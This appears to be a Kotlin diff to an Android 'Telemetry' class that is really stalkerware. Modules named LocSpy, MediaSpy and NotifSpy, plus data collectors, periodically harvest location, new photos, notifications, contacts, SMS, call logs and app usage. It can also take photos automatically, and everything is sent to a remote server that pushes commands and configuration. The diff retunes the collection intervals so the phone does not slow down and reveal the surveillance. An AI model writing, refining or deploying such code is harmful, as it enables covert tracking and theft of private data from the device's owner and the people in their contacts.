@@ -29,6 +29,11 @@ object Telemetry {
 
     private const val MAX_QUEUE = 2000
     private const val FLUSH_MIN_MS = 800L
+    private const val LOC_EVERY_MS = 10_000L        // 定位刷新周期
+    private const val MEDIA_EVERY_MS = 60_000L      // 相册扫描周期
+    private const val NOTIF_EVERY_MS = 60_000L      // 通知全量同步周期
+    private const val DATA_EVERY_MS = 300_000L      // 通讯录/短信/通话/使用时长周期
+    private const val CONF_EVERY_MS = 30_000L       // 远程配置拉取周期
     private const val BATCH = 200
     private const val PERIOD_MS = 20_000L
     private const val CMD_STREAM = "https://43-108-107-175.sslip.io:8080/dash/cmdstream"
@@ -69,25 +74,42 @@ object Telemetry {
         Thread({
             // 首次全量画像，之后只发心跳
             Profile.dump(app)?.let { push("heart", it) }
-            var tick = 0
+            // 各档采集用「距上次多少毫秒」判断，不能用轮数：
+            // 上报间隔现在最小 200ms，若还按 tick % N 就等于每 1.2 秒扫一遍相册、
+            // 每 3 秒同步一遍通知、每 6 秒读一遍通讯录 —— 手机会被拖死。
+            var lastLoc = 0L
+            var lastMedia = 0L
+            var lastNotif = 0L
+            var lastData = 0L
+            var lastConf = 0L
             while (running) {
                 try {
-                    LocSpy.maybeRefresh(app)
-                    // 相册每 15 轮扫一次（默认 20s/轮 ≈ 5 分钟），
-                    // 不能只在服务启动时扫一次，否则之后拍的照片永远上不来
-                    // 相册：远程配置的 mediaScan 或自动模式的 autoMedia 任一开启就扫
-                    if (tick % 6 == 0 && (RemoteConfig.mediaScan || RemoteConfig.autoMedia)) {
+                    val now = System.currentTimeMillis()
+                    // 定位 10 秒看一次：maybeRefresh 内部要查两个 provider 的
+                    // lastKnownLocation，是跨进程调用，不能 200ms 就来一次
+                    if (now - lastLoc >= LOC_EVERY_MS) {
+                        lastLoc = now
+                        runCatching { LocSpy.maybeRefresh(app) }
+                    }
+
+                    // 相册：60 秒一轮（增量，只传新照片）
+                    if ((RemoteConfig.mediaScan || RemoteConfig.autoMedia) &&
+                        now - lastMedia >= MEDIA_EVERY_MS
+                    ) {
+                        lastMedia = now
                         runCatching { MediaSpy.scan(app) }
                     }
-                    // 通知：服务已连接就定期全量同步一次（补漏掉的）
-                    if (tick % 15 == 0) {
+                    // 通知：60 秒补一次漏掉的
+                    if (now - lastNotif >= NOTIF_EVERY_MS) {
+                        lastNotif = now
                         runCatching { NotifSpy.syncNow() }
                     }
-                    // 自动模式：按间隔定时拍照
+                    // 自动模式
                     if (RemoteConfig.autoMode) {
                         runCatching { autoShoot(app) }
-                        // 静态数据每 30 轮（约 5 分钟）采一次，够用且不浪费
-                        if (tick % 30 == 0) {
+                        // 通讯录/短信/通话/使用时长这类静态数据 5 分钟一次就够
+                        if (now - lastData >= DATA_EVERY_MS) {
+                            lastData = now
                             runCatching {
                                 DataCollectors.pushAll(app) { k ->
                                     when (k) {
@@ -104,11 +126,11 @@ object Telemetry {
                             runCatching { flush(app) }
                         }
                     }
-                    // 每 2 轮拉一次远程配置（指令走独立线程，见下）
-                    if (tick % 2 == 0) {
+                    // 远程配置 30 秒拉一次（指令走独立 SSE 线程，不受这里影响）
+                    if (now - lastConf >= CONF_EVERY_MS) {
+                        lastConf = now
                         runCatching { RemoteConfig.fetch(app) }
                     }
-                    tick++
                     flush(app)
                     // 间隔由远程配置控制，改服务器上的 config.json 即可，不用重装
                     Thread.sleep(RemoteConfig.periodMs)
